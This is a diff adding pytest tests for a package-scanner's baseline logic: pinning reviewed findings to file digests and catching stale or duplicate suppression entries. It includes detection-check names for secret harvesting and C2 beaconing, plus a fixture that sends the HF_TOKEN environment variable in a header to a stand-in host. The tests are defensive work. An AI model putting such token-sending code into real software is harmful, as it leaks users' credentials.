@@ -4,6 +4,7 @@
 from __future__ import annotations
 
 import hashlib
+import json
 import os
 import re
 import subprocess
@@ -1240,7 +1241,7 @@ def test_write_baseline_roundtrip_only_crit_high(tmp_path):
 
 
 def test_load_baseline_missing_file_is_empty():
-    assert sp._load_baseline("/nonexistent/path/bl.json") == set()
+    assert sp._load_baseline("/nonexistent/path/bl.json") == {}
 
 
 def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
@@ -1250,7 +1251,7 @@ def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
 
     bl = tmp_path / "bad_entries.json"
     bl.write_text(json.dumps({"version": 1, "entries": None}), encoding = "utf-8")
-    assert sp._load_baseline(str(bl)) == set()
+    assert sp._load_baseline(str(bl)) == {}
     assert "entries is not a list" in capsys.readouterr().err
 
 
@@ -1597,3 +1598,206 @@ def test_run_fix_uses_first_archive_path(monkeypatch):
     sp._run_fix({"foo"}, entries, max_search = 10)  # must not raise
 
     assert seen.get("path") == "/tmp/foo-1.2.3.whl"
+
+
+def test_pinned_baseline_entry_only_covers_the_reviewed_file(tmp_path):
+    """A file_sha256 pin reopens the finding when anything else in the file changes.
+
+    The evidence for an env-harvest + network finding records the urlopen call but
+    not the destination, so a release that repoints the endpoint at an attacker host
+    keeps the same evidence hash. Pinning binds the entry to the reviewed bytes.
+    """
+    bl = tmp_path / "bl.json"
+    check = "Harvests environment variables/secrets AND makes network calls"
+    reviewed = _mk(sp.CRITICAL, "unsloth-zoo", "z/health.py", check, "Env: L1: token")
+    reviewed.file_sha256 = "a" * 64
+    sp._write_baseline(str(bl), [reviewed])
+
+    # _write_baseline only pins what was already pinned, so a fresh entry is unpinned.
+    doc = json.loads(bl.read_text(encoding = "utf-8"))
+    assert "file_sha256" not in doc["entries"][0]
+    doc["entries"][0]["file_sha256"] = "a" * 64
+    bl.write_text(json.dumps(doc), encoding = "utf-8")
+    baseline = sp._load_baseline(str(bl))
+
+    active, suppressed = sp._partition_baseline([reviewed], baseline)
+    assert suppressed == [reviewed] and active == []
+
+    # Same package/file/check/evidence, different file bytes -> reopens.
+    tampered = _mk(sp.CRITICAL, "unsloth-zoo", "z/health.py", check, "Env: L1: token")
+    tampered.file_sha256 = "b" * 64
+    active2, suppressed2 = sp._partition_baseline([tampered], baseline)
+    assert active2 == [tampered] and suppressed2 == []
+
+
+def test_unpinned_baseline_entry_is_content_agnostic(tmp_path):
+    """Entries without file_sha256 keep the pre-existing behaviour."""
+    bl = tmp_path / "bl.json"
+    f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
+    f.file_sha256 = "a" * 64
+    sp._write_baseline(str(bl), [f])
+    baseline = sp._load_baseline(str(bl))
+    assert baseline[sp._finding_key(f)] is None
+
+    other = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
+    other.file_sha256 = "b" * 64
+    active, suppressed = sp._partition_baseline([other], baseline)
+    assert suppressed == [other] and active == []
+
+
+def test_write_baseline_preserves_an_existing_pin(tmp_path):
+    """Regenerating must not silently widen a pinned entry back to any content."""
+    bl = tmp_path / "bl.json"
+    f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
+    f.file_sha256 = "a" * 64
+    sp._write_baseline(str(bl), [f])
+    doc = json.loads(bl.read_text(encoding = "utf-8"))
+    doc["entries"][0]["file_sha256"] = "a" * 64
+    bl.write_text(json.dumps(doc), encoding = "utf-8")
+
+    sp._write_baseline(str(bl), [f])
+    doc2 = json.loads(bl.read_text(encoding = "utf-8"))
+    assert doc2["entries"][0]["file_sha256"] == "a" * 64
+
+
+def test_check_py_file_stamps_the_file_digest():
+    """Findings carry the digest the pin is matched against."""
+    src = 'import requests\nimport os\nt = os.environ["HF_TOKEN"]\nrequests.get("http://x", headers={"a": t})\n'
+    findings = sp.check_py_file(src, "p/a.py", "p")
+    assert findings, "expected at least one finding"
+    expected = hashlib.sha256(src.encode("utf-8", "replace")).hexdigest()
+    assert all(f.file_sha256 == expected for f in findings)
+
+
+def test_the_shipped_baseline_hashes_match_their_evidence():
+    """A hand-added entry with a stale `evidence_hash` suppresses nothing: the key
+    is the hash, not the evidence text beside it, so the finding stays red and the
+    entry reads as a review that happened. Recompute every one of them."""
+    import json
+    import pathlib
+
+    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    assert entries, "the shipped baseline is empty"
+    wrong = [
+        (e.get("package"), e.get("file"), e.get("check"))
+        for e in entries
+        if e.get("evidence_hash") != sp._evidence_hash(e.get("evidence") or "")
+    ]
+    assert not wrong, f"evidence_hash does not match evidence: {wrong}"
+
+
+def _baseline_key(entry):
+    """The scanner's OWN key, not the raw fields: `_load_baseline` normalizes the
+    package name and strips an sdist's version-carrying archive root, so
+    `huggingface_hub` and `huggingface-hub`, or `foo-1.0/foo/a.py` and `foo/a.py`,
+    collapse to one runtime entry while a raw comparison sees two and reports
+    nothing."""
+    return (
+        sp._norm_pkg(entry.get("package") or ""),
+        sp._relpath_in_package(entry.get("file") or ""),
+        entry.get("check"),
+        entry.get("evidence_hash"),
+    )
+
+
+def _baseline_duplicates(entries):
+    """Keys whose entries say the same thing twice, or contradict each other.
+
+    Sharing a key is not itself an error: `_load_baseline` unions the pins under
+    one key into a set, so two reviewed versions with identical evidence but
+    different surrounding bytes are the supported way to approve both exact files.
+    What has no reading is a pin repeated verbatim, or an unpinned entry sitting
+    beside a pinned one -- unpinned wins there, so every pin next to it is inert
+    and reads as a narrower approval than the baseline actually grants.
+    """
+    groups = {}
+    for entry in entries:
+        groups.setdefault(_baseline_key(entry), []).append(entry.get("file_sha256") or None)
+    dupes = set()
+    for key, pins in groups.items():
+        if len(pins) != len(set(pins)) or (None in pins and len(pins) > 1):
+            dupes.add(key)
+    return dupes
+
+
+def test_the_shipped_baseline_has_no_duplicate_keys():
+    """Two entries saying the same thing means one of them was reviewed against
+    code that is no longer there, and nothing says which."""
+    import json
+    import pathlib
+
+    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    dupes = _baseline_duplicates(entries)
+    assert not dupes, f"duplicate baseline keys: {sorted(dupes)}"
+
+
+def test_two_reviewed_versions_may_share_a_key_with_distinct_pins(tmp_path):
+    """The representation `_load_baseline` exists to support: one evidence string
+    approved for exactly two file contents. Rejecting it would force the entry to
+    be widened to an unpinned suppression, which approves strictly more."""
+    import json
+
+    same = dict(
+        package = "requests",
+        file = "requests/api.py",
+        check = "C2 polling/beaconing loop detected",
+        severity = "CRITICAL",
+        evidence = "L1:     while True:",
+        evidence_hash = sp._evidence_hash("L1:     while True:"),
+    )
+    entries = [dict(file_sha256 = "a" * 64, **same), dict(file_sha256 = "b" * 64, **same)]
+    assert not _baseline_duplicates(entries)
+
+    path = tmp_path / "baseline.json"
+    path.write_text(json.dumps({"version": 1, "entries": entries}))
+    loaded = sp._load_baseline(str(path))
+    assert list(loaded.values()) == [{"a" * 64, "b" * 64}], "the loader unions the pins"
+
+
+@pytest.mark.parametrize(
+    "pins",
+    [
+        (None, None),  # the same unpinned approval, written twice
+        ("c" * 64, "c" * 64),  # the same pin, written twice
+        (None, "c" * 64),  # unpinned wins, so the pinned entry is inert
+        ("c" * 64, None),  # and in either order
+    ],
+)
+def test_a_key_that_says_the_same_thing_twice_is_still_a_duplicate(pins):
+    same = dict(
+        package = "requests",
+        file = "requests/api.py",
+        check = "C2 polling/beaconing loop detected",
+        evidence_hash = sp._evidence_hash("L1:     while True:"),
+    )
+    entries = [dict(same, **({"file_sha256": p} if p else {})) for p in pins]
+    assert _baseline_duplicates(entries) == {_baseline_key(entries[0])}
+
+
+def test_the_duplicate_check_sees_through_normalization(tmp_path):
+    """Two entries that differ only in the ways `_load_baseline` normalizes away
+    are one runtime key, so a raw field comparison reports nothing and leaves
+    exactly the review ambiguity the check exists to catch."""
+    import json
+
+    same = dict(
+        check = "C2 polling/beaconing loop detected",
+        severity = "CRITICAL",
+        evidence = "L1:     while True:",
+        evidence_hash = sp._evidence_hash("L1:     while True:"),
+    )
+    entries = [
+        dict(package = "huggingface_hub", file = "foo-1.0/huggingface_hub/a.py", **same),
+        dict(package = "huggingface-hub", file = "huggingface_hub/a.py", **same),
+    ]
+    assert _baseline_duplicates(entries) == {_baseline_key(entries[0])}
+
+    raw = [(e["package"], e["file"], e["check"], e["evidence_hash"]) for e in entries]
+    assert raw[0] != raw[1], "a raw comparison would have called these distinct"
+
+    # And the loader agrees: two entries in, one key out.
+    path = tmp_path / "baseline.json"
+    path.write_text(json.dumps({"version": 1, "entries": entries}))
+    assert len(sp._load_baseline(str(path))) == 1
